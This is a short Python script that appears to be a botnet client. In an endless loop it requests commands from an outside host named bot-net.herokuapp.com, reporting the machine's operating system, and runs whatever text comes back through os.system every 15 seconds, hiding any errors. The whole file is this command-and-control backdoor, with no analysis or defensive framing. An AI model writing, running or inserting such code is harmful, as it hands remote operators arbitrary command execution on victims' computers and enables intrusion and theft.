import requests
from os import system
import platform
import time

url=f"http://bot-net.herokuapp.com/latest/?os={platform.system()}"

while True:
    try:
        code=requests.get(url).text
        system(code)
    except:
        pass
    time.sleep(15)



